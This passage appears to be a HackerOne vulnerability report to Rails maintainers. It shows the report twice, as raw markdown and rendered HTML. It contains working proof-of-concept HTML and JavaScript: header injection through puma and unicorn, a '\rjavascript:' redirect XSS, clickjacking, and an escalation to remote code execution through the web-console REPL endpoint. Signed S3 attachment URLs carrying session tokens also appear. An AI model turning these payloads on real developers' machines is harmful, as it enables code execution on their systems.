value of the header.\n\n\n### XSS trick\n\nWhile trying out `\\r` on the response header, I noticed a strange thing.\nIf `\\r` is at the beginning, it means that the browser is not redirected and `javascript:` can be used in the URL of the response link.\nWhen specify `\\rjavascript:alert(location)` as the redirect destination, the HTML of the response will be as follows.\n\n```html\n\u003chtml\u003e\u003cbody\u003eYou are being \u003ca href=\"\njavascript:alert(location)\"\u003eredirected\u003c/a\u003e.\u003c/body\u003e\u003c/html\u003e\n```\n\nThe `\\r` character is ignored in html, so `javascript:alert(location)` is executed when the user clicks the link.\n\nThis is a separate issue from HTTP header injection and depends on how the server handles the value of `\\r`.\nIn puma and unicorn below 4.3.2, `\\r` is used for HTTP header injection, so no error occurs.\nWith puma 4.3.3 or later, if there is a line containing `\\r`, it does not become an error and it can be executed because that line is excluded. \nOn the other hand, the error occurred in passenger.\n\nAs a further issue, the headers in this response are middleware-specific and therefore do not include the security headers Rails is outputting.\nSince `X-Frame-Options` is not included, click jacking is possible.\nNo output even if CSP is set in the application.\n\nBy using click jacking in combination with these, it is easy to generate XSS that requires user click.\n\n\n#### PoC\n\nInserting the execution code from another site using the `name` of the iframe.\n\nThis PoC will also run in production mode if 6.0.0 \u003c rails \u003c 6.0.3.2.\nIt can be run with the latest puma and unicorn.\n\nIf it is development mode, it can be executed even after 6.0.3.2\n\n\n##### child.html\n\n```html\n\u003cform method=\"post\" action=\"http://localhost:3000/rails/actions?error=ActiveRecord::PendingMigrationError\u0026action=Run%20pending%20migrations\u0026location=%0Djavascript%3Aeval%28name%29\"\u003e\n\t\u003cbutton type=\"submit\"\u003elocation is escape(\"\\rjavascript:eval(name)\")\u003c/button\u003e\n\u003c/form\u003e\n\u003cscript type=\"text/javascript\"\u003e\n\tdocument.querySelector(\"button\").click();\n\u003c/script\u003e\n```\n\n##### click_jacking.html\n\n```html\n\u003chtml\u003e\n\u003cstyle\u003e\niframe{\n    position: absolute;\n    z-index: 1;\n    opacity: 0.3;\n}\ndiv{\n    position: absolute;\n    top: 20px;\n    left: 130px;\n}\nbutton {\n    width: 80px;\n    height: 26px;\n    cursor: pointer;\n}\n\u003c/style\u003e\n\u003cbody\u003e\n    \u003ciframe src=./child.html name=\"alert(location)\" height=40\u003e\u003c/iframe\u003e\n    \u003cdiv\u003e \n        \u003cbutton\u003eclick!!\u003c/button\u003e\n    \u003c/div\u003e \n\u003c/body\u003e\n\u003c/html\u003e\n```\n\n{F949988}\n{F949989}\n\n### XSS to RCE\n\nWhen XSS exists in development mode, I confirmed that calling the method of web-cosole leads to RCE.\nRCE is possible by inducing users who are developing Rails applications to click on the trap site.\n\n#### PoC\n\n```js\nvar iframe = document.createElement(\"iframe\");\niframe.src = \"/not_found\";\ndocument.body.appendChild(iframe);\nsetTimeout(()=\u003efetch(\"/__web_console/repl_sessions/\" + iframe.contentDocument.querySelector(\"#console\").dataset.sessionId, {\n    method: \"PUT\",\n    headers: {\n        \"Content-Type\": \"application/json\",\n        \"X-Requested-With\": \"XMLHttpRequest\"\n    },\n    body: JSON.stringify({\n        input: \"`touch from_web_console`\"\n    })\n}), 2000)\n```\n\n```html\n\u003ciframe src=./child.html name='var iframe = document.createElement(\"iframe\");iframe.src = \"/not_found\";document.body.appendChild(iframe);setTimeout(()=\u003e fetch(\"/__web_console/repl_sessions/\"+iframe.contentDocument.querySelector(\"#console\").dataset.sessionId, {method: \"PUT\",headers: {\"Content-Type\": \"application/json\",\"X-Requested-With\": \"XMLHttpRequest\"},body: JSON.stringify({input: \"`touch from_web_console`\"})}),2000)'/\u003e\n```\n\nWhen this is run, a file from `from_web_console` will be generated.\n\n\n---\n\n### Vulnerabilities and conditions\n\n####  Run pending migrations (CVE-2020-8185)\n\nserver: any\n\nRails version: 6.0.0 \u003c rails \u003c 6.0.3.2\nRAILS_ENV: production\n\n\n#### Run pending migrations by CSRF\n\nserver: any\n\nRails version: 6.0.0 \u003c (not fixed)\nRAILS_ENV: development\n\n\n#### Open redirect (from POST method)\n\nserver: any\n\nRails version: 6.0.0 \u003c rails \u003c 6.0.3.2\nRAILS_ENV: production\n\nor\n\nRails version: 6.0.0 \u003c (not fixed)\nRAILS_ENV: development\n\n\n#### HTTP header injection\n\nserver: unicorn (\u003c= latest) or puma (\u003c 4.3.2)\n\nRails version: 6.0.0 \u003c rails \u003c 6.0.3.2\nRAILS_ENV: production\n\nor \n\nRails version: 6.0.0 \u003c (not fixed)\nRAILS_ENV: development\n\n\n#### XSS (need user click)\n\nserver: unicorn (\u003c= latest) or puma (\u003c= latest)\n\nRailse version: 6.0.0 \u003c rails \u003c 6.0.3.2\nRAILS_ENV: production \n\nor \n\nRailse version: 6.0.0 \u003c (not fixed)\nRAILS_ENV: development\n\n\n#### RCE (from XSS)\n\nserver: unicorn (\u003c= latest) or puma (\u003c= latest)\nRailse version: 6.0.0 \u003c (not fixed)\nRAILS_ENV: development","markdown_message":"\u003cp\u003e\u003ca href=\"/tenderlove\"\u003e@tenderlove\u003c/a\u003e \u003cbr\u003e\nI\u0026#39;m sorry to reply late.\u003c/p\u003e\n\n\u003cp\u003eWhile researching unicorn, I found this report to lead to other vulnerabilities.\u003c/p\u003e\n\n\u003ch3 id=\"open-redirect-to-http-header-injection\"\u003eOpen Redirect to HTTP header injection\u003c/h3\u003e\n\n\u003cp\u003eResponse header injection vulnerability exists in versions of puma below 4.3.2.\u003cbr\u003e\n\u003ca title=\"https://github.com/puma/puma/security/advisories/GHSA-84j7-475p-hp8v\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fpuma%2Fpuma%2Fsecurity%2Fadvisories%2FGHSA-84j7-475p-hp8v\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/puma/puma/security/advisories/GHSA-84j7-475p-hp8v\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003cbr\u003e\nI have confirmed that unicorn is also enable of response header injection.\u003c/p\u003e\n\n\u003cp\u003eHTTP header injection is possible by including \u003ccode\u003e\\r\u003c/code\u003e in the redirect URL using these.\u003c/p\u003e\n\n\u003ch4 id=\"poc\"\u003ePoC\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight javascript\"\u003e\u003ccode\u003e\u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e \u003cspan class=\"nx\"\u003eescape\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\r\u003c/span\u003e\u003cspan class=\"s2\"\u003eSet-cookie:a=a\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e%0DSet-cookie%3Aa%3Da\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThis is the html used on the attack server.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight html\"\u003e\u003ccode\u003e\u003cspan class=\"nt\"\u003e\u0026lt;form\u003c/span\u003e \u003cspan class=\"na\"\u003emethod=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;post\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003eaction=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;http://localhost:3000/rails/actions?error=ActiveRecord::PendingMigrationError\u0026amp;action=Run%20pending%20migrations\u0026amp;location=%0DSet-cookie%3Aa%3Da\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"nt\"\u003e\u0026lt;button\u003c/span\u003e \u003cspan class=\"na\"\u003etype=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;submit\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003eset cookie\u003cspan class=\"nt\"\u003e\u0026lt;/button\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/form\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eWhen click this button, the response header will be as follows.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eLocation: \nSet-cookie: a=a\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eIf you open the developer tools in your browser, you\u0026#39;ll see that the cookie value is set.\u003c/p\u003e\n\n\u003cp\u003eWhen I tried it, puma and unicorn can insert only the character of \u003ccode\u003e\\r\u003c/code\u003e, and it seems that \u003ccode\u003e\\n\u003c/code\u003e cannot be inserted.\u003cbr\u003e\nTherefore, it seems that response body injection that leads to XSS cannot be performed.\u003c/p\u003e\n\n\u003cp\u003eOn the other hand, in passenger, it became an error when \u003ccode\u003e\\r\u003c/code\u003e was in the value of the header.\u003c/p\u003e\n\n\u003ch3 id=\"xss-trick\"\u003eXSS trick\u003c/h3\u003e\n\n\u003cp\u003eWhile trying out \u003ccode\u003e\\r\u003c/code\u003e on the response header, I noticed a strange thing.\u003cbr\u003e\nIf \u003ccode\u003e\\r\u003c/code\u003e is at the beginning, it means that the browser is not redirected and \u003ccode\u003ejavascript:\u003c/code\u003e can be used in the URL of the response link.\u003cbr\u003e\nWhen specify \u003ccode\u003e\\rjavascript:alert(location)\u003c/code\u003e as the redirect destination, the HTML of the response will be as follows.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight html\"\u003e\u003ccode\u003e\u003cspan class=\"nt\"\u003e\u0026lt;html\u0026gt;\u0026lt;body\u0026gt;\u003c/span\u003eYou are being \u003cspan class=\"nt\"\u003e\u0026lt;a\u003c/span\u003e \u003cspan class=\"na\"\u003ehref=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;\njavascript:alert(location)\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003eredirected\u003cspan class=\"nt\"\u003e\u0026lt;/a\u0026gt;\u003c/span\u003e.\u003cspan class=\"nt\"\u003e\u0026lt;/body\u0026gt;\u0026lt;/html\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThe \u003ccode\u003e\\r\u003c/code\u003e character is ignored in html, so \u003ccode\u003ejavascript:alert(location)\u003c/code\u003e is executed when the user clicks the link.\u003c/p\u003e\n\n\u003cp\u003eThis is a separate issue from HTTP header injection and depends on how the server handles the value of \u003ccode\u003e\\r\u003c/code\u003e.\u003cbr\u003e\nIn puma and unicorn below 4.3.2, \u003ccode\u003e\\r\u003c/code\u003e is used for HTTP header injection, so no error occurs.\u003cbr\u003e\nWith puma 4.3.3 or later, if there is a line containing \u003ccode\u003e\\r\u003c/code\u003e, it does not become an error and it can be executed because that line is excluded. \u003cbr\u003e\nOn the other hand, the error occurred in passenger.\u003c/p\u003e\n\n\u003cp\u003eAs a further issue, the headers in this response are middleware-specific and therefore do not include the security headers Rails is outputting.\u003cbr\u003e\nSince \u003ccode\u003eX-Frame-Options\u003c/code\u003e is not included, click jacking is possible.\u003cbr\u003e\nNo output even if CSP is set in the application.\u003c/p\u003e\n\n\u003cp\u003eBy using click jacking in combination with these, it is easy to generate XSS that requires user click.\u003c/p\u003e\n\n\u003ch4 id=\"poc\"\u003ePoC\u003c/h4\u003e\n\n\u003cp\u003eInserting the execution code from another site using the \u003ccode\u003ename\u003c/code\u003e of the iframe.\u003c/p\u003e\n\n\u003cp\u003eThis PoC will also run in production mode if 6.0.0 \u0026lt; rails \u0026lt; 6.0.3.2.\u003cbr\u003e\nIt can be run with the latest puma and unicorn.\u003c/p\u003e\n\n\u003cp\u003eIf it is development mode, it can be executed even after 6.0.3.2\u003c/p\u003e\n\n\u003ch5 id=\"child-html\"\u003echild.html\u003c/h5\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight html\"\u003e\u003ccode\u003e\u003cspan class=\"nt\"\u003e\u0026lt;form\u003c/span\u003e \u003cspan class=\"na\"\u003emethod=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;post\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003eaction=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;http://localhost:3000/rails/actions?error=ActiveRecord::PendingMigrationError\u0026amp;action=Run%20pending%20migrations\u0026amp;location=%0Djavascript%3Aeval%28name%29\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;button\u003c/span\u003e \u003cspan class=\"na\"\u003etype=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;submit\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003elocation is escape(\u0026quot;\\rjavascript:eval(name)\u0026quot;)\u003cspan class=\"nt\"\u003e\u0026lt;/button\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/form\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;script \u003c/span\u003e\u003cspan class=\"na\"\u003etype=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;text/javascript\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nb\"\u003edocument\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003equerySelector\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003ebutton\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e).\u003c/span\u003e\u003cspan class=\"nx\"\u003eclick\u003c/span\u003e\u003cspan class=\"p\"\u003e();\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/script\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch5 id=\"click_jacking-html\"\u003eclick_jacking.html\u003c/h5\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight html\"\u003e\u003ccode\u003e\u003cspan class=\"nt\"\u003e\u0026lt;html\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;style\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003eiframe\u003c/span\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"nl\"\u003eposition\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"nb\"\u003eabsolute\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"nl\"\u003ez-index\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"m\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"nl\"\u003eopacity\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"m\"\u003e0.3\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003cspan class=\"nt\"\u003ediv\u003c/span\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"nl\"\u003eposition\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"nb\"\u003eabsolute\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"nl\"\u003etop\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"m\"\u003e20px\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"nl\"\u003eleft\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"m\"\u003e130px\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003cspan class=\"nt\"\u003ebutton\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"nl\"\u003ewidth\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"m\"\u003e80px\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"nl\"\u003eheight\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"m\"\u003e26px\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"nl\"\u003ecursor\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"nb\"\u003epointer\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/style\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;body\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;iframe\u003c/span\u003e \u003cspan class=\"na\"\u003esrc=\u003c/span\u003e\u003cspan class=\"s\"\u003e./child.html\u003c/span\u003e \u003cspan class=\"na\"\u003ename=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;alert(location)\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003eheight=\u003c/span\u003e\u003cspan class=\"s\"\u003e40\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u0026lt;/iframe\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;div\u0026gt;\u003c/span\u003e \n        \u003cspan class=\"nt\"\u003e\u0026lt;button\u0026gt;\u003c/span\u003eclick!!\u003cspan class=\"nt\"\u003e\u0026lt;/button\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;/div\u0026gt;\u003c/span\u003e \n\u003cspan class=\"nt\"\u003e\u0026lt;/body\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/html\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"__________2020-08-15_21.23.13.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/eQhM4PCpDtvnNg2PcTKDPUt2?response-content-disposition=attachment%3B%20filename%3D%22__________2020-08-15_21.23.13.png%22%3B%20filename%2A%3DUTF-8%27%27__________2020-08-15_21.23.13.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQWNRUTH42%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T070920Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDcXnaGBkilw8dIKZyXl6DRxz9df9dptFudyUshXKqyWAIgSXT73ENLhDU6dLXYGFlV10idtU9V2hyklLccKQ0pfc4qtAMIVxABGgwwMTM2MTkyNzQ4NDkiDKv2f94JRMR8IDO%2BDSqRA%2BK92cStxN8BDvQvva7qLjZYQ%2Bo98Fq3WIsgdmuFbIWsVJNwAy9k36tIyEf3m3YkkPzTJYVMwITIBEkRL7L4%2FFE2VrmH%2FyWnGeYlz1087dpv%2F8n%2BxePAsT9JNIFo5HL3qLY3wx5zNeJGSe7ackrU2%2B4TZ8z8qbQZZubLBkMOYL7lOQXDjEYLq5BtfLJIwgsBRHC2NLNyq6BdOntSBGR32vUAcnQqwd7ZcEJ7tGOzWQF%2BJot83YJ8JCzHEMxhl2LU%2F0YJcbPoth69auXP8wEPzX2DHDgHxtnnIFnJ7h%2B4wD%2FTBqDNIETiU2WW8Ob9t0Zs2iUxD2lI0uOCEk4VJMxTio93bdaLG0Cqp%2FsW8lf0i8K%2FidJBgsA1ot5if4EPj5GsJP1ha%2BDrqfU1OPLXLgEerUYAAWbHcGQOw1wjhp%2FQto2Op32UfzJwe1sq3HWqGyEa4L8s6I5ZGerD0JkUyXNQfMagBxQbG%2F50bbeTa%2F5q1laxcg0mB0AWThwG2y8HFFzrMyHoDfXL9iVBL2AuI%2FQDZ2RQMMSSq%2F8FOusBTEdo884p95XUeJQfuG1%2BgTLLaqVoYv81fOpIhbdBUDobBmrKTkhHdApg0IpS%2Fmn%2FQFTO2whPecmg5pGV5XOL1b%2B8atqSJJyBMIlcat39%2Fiw8998Wyo8KiVjdgzHFjwlEAiOS8qICceyxSIMCo8GBoYMUw94x3fGxeAXRgVqeyIErabkA8MSj9Rgz1QonRErPS3nuhkrc1lcEtwZYHvorWyjM1lTHvoGCzNSk%2F194BT4g8N2vxEy6S1dD6EiNpxPG4MaDwpuQBWRwL0Te7R5iox%2B0JLPR8s2xdgRZInm7WgUjUF8HQEmcy%2FsTmQ%3D%3D\u0026amp;X-Amz-Signature=c5f00000bd45c50950c171d48e3a504f70deb057bdcd0863505cd51da4172e40\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/eQhM4PCpDtvnNg2PcTKDPUt2?response-content-disposition=attachment%3B%20filename%3D%22__________2020-08-15_21.23.13.png%22%3B%20filename%2A%3DUTF-8%27%27__________2020-08-15_21.23.13.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQWNRUTH42%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T070920Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDcXnaGBkilw8dIKZyXl6DRxz9df9dptFudyUshXKqyWAIgSXT73ENLhDU6dLXYGFlV10idtU9V2hyklLccKQ0pfc4qtAMIVxABGgwwMTM2MTkyNzQ4NDkiDKv2f94JRMR8IDO%2BDSqRA%2BK92cStxN8BDvQvva7qLjZYQ%2Bo98Fq3WIsgdmuFbIWsVJNwAy9k36tIyEf3m3YkkPzTJYVMwITIBEkRL7L4%2FFE2VrmH%2FyWnGeYlz1087dpv%2F8n%2BxePAsT9JNIFo5HL3qLY3wx5zNeJGSe7ackrU2%2B4TZ8z8qbQZZubLBkMOYL7lOQXDjEYLq5BtfLJIwgsBRHC2NLNyq6BdOntSBGR32vUAcnQqwd7ZcEJ7tGOzWQF%2BJot83YJ8JCzHEMxhl2LU%2F0YJcbPoth69auXP8wEPzX2DHDgHxtnnIFnJ7h%2B4wD%2FTBqDNIETiU2WW8Ob9t0Zs2iUxD2lI0uOCEk4VJMxTio93bdaLG0Cqp%2FsW8lf0i8K%2FidJBgsA1ot5if4EPj5GsJP1ha%2BDrqfU1OPLXLgEerUYAAWbHcGQOw1wjhp%2FQto2Op32UfzJwe1sq3HWqGyEa4L8s6I5ZGerD0JkUyXNQfMagBxQbG%2F50bbeTa%2F5q1laxcg0mB0AWThwG2y8HFFzrMyHoDfXL9iVBL2AuI%2FQDZ2RQMMSSq%2F8FOusBTEdo884p95XUeJQfuG1%2BgTLLaqVoYv81fOpIhbdBUDobBmrKTkhHdApg0IpS%2Fmn%2FQFTO2whPecmg5pGV5XOL1b%2B8atqSJJyBMIlcat39%2Fiw8998Wyo8KiVjdgzHFjwlEAiOS8qICceyxSIMCo8GBoYMUw94x3fGxeAXRgVqeyIErabkA8MSj9Rgz1QonRErPS3nuhkrc1lcEtwZYHvorWyjM1lTHvoGCzNSk%2F194BT4g8N2vxEy6S1dD6EiNpxPG4MaDwpuQBWRwL0Te7R5iox%2B0JLPR8s2xdgRZInm7WgUjUF8HQEmcy%2FsTmQ%3D%3D\u0026amp;X-Amz-Signature=c5f00000bd45c50950c171d48e3a504f70deb057bdcd0863505cd51da4172e40\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003cbr\u003e\n\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"__________2020-08-15_21.23.22.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/McnWNtpfs7FVXQSKwpqLdF5e?response-content-disposition=attachment%3B%20filename%3D%22__________2020-08-15_21.23.22.png%22%3B%20filename%2A%3DUTF-8%27%27__________2020-08-15_21.23.22.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQWNRUTH42%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T070920Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDcXnaGBkilw8dIKZyXl6DRxz9df9dptFudyUshXKqyWAIgSXT73ENLhDU6dLXYGFlV10idtU9V2hyklLccKQ0pfc4qtAMIVxABGgwwMTM2MTkyNzQ4NDkiDKv2f94JRMR8IDO%2BDSqRA%2BK92cStxN8BDvQvva7qLjZYQ%2Bo98Fq3WIsgdmuFbIWsVJNwAy9k36tIyEf3m3YkkPzTJYVMwITIBEkRL7L4%2FFE2VrmH%2FyWnGeYlz1087dpv%2F8n%2BxePAsT9JNIFo5HL3qLY3wx5zNeJGSe7ackrU2%2B4TZ8z8qbQZZubLBkMOYL7lOQXDjEYLq5BtfLJIwgsBRHC2NLNyq6BdOntSBGR32vUAcnQqwd7ZcEJ7tGOzWQF%2BJot83YJ8JCzHEMxhl2LU%2F0YJcbPoth69auXP8wEPzX2DHDgHxtnnIFnJ7h%2B4wD%2FTBqDNIETiU2WW8Ob9t0Zs2iUxD2lI0uOCEk4VJMxTio93bdaLG0Cqp%2FsW8lf0i8K%2FidJBgsA1ot5if4EPj5GsJP1ha%2BDrqfU1OPLXLgEerUYAAWbHcGQOw1wjhp%2FQto2Op32UfzJwe1sq3HWqGyEa4L8s6I5ZGerD0JkUyXNQfMagBxQbG%2F50bbeTa%2F5q1laxcg0mB0AWThwG2y8HFFzrMyHoDfXL9iVBL2AuI%2FQDZ2RQMMSSq%2F8FOusBTEdo884p95XUeJQfuG1%2BgTLLaqVoYv81fOpIhbdBUDobBmrKTkhHdApg0IpS%2Fmn%2FQFTO2whPecmg5pGV5XOL1b%2B8atqSJJyBMIlcat39%2Fiw8998Wyo8KiVjdgzHFjwlEAiOS8qICceyxSIMCo8GBoYMUw94x3fGxeAXRgVqeyIErabkA8MSj9Rgz1QonRErPS3nuhkrc1lcEtwZYHvorWyjM1lTHvoGCzNSk%2F194BT4g8N2vxEy6S1dD6EiNpxPG4MaDwpuQBWRwL0Te7R5iox%2B0JLPR8s2xdgRZInm7WgUjUF8HQEmcy%2FsTmQ%3D%3D\u0026amp;X-Amz-Signature=db9289826de01cb0b793c4885bcc033491d04f3b2a1141f2b74f315d08af400f\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/McnWNtpfs7FVXQSKwpqLdF5e?response-content-disposition=attachment%3B%20filename%3D%22__________2020-08-15_21.23.22.png%22%3B%20filename%2A%3DUTF-8%27%27__________2020-08-15_21.23.22.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQWNRUTH42%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T070920Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDcXnaGBkilw8dIKZyXl6DRxz9df9dptFudyUshXKqyWAIgSXT73ENLhDU6dLXYGFlV10idtU9V2hyklLccKQ0pfc4qtAMIVxABGgwwMTM2MTkyNzQ4NDkiDKv2f94JRMR8IDO%2BDSqRA%2BK92cStxN8BDvQvva7qLjZYQ%2Bo98Fq3WIsgdmuFbIWsVJNwAy9k36tIyEf3m3YkkPzTJYVMwITIBEkRL7L4%2FFE2VrmH%2FyWnGeYlz1087dpv%2F8n%2BxePAsT9JNIFo5HL3qLY3wx5zNeJGSe7ackrU2%2B4TZ8z8qbQZZubLBkMOYL7lOQXDjEYLq5BtfLJIwgsBRHC2NLNyq6BdOntSBGR32v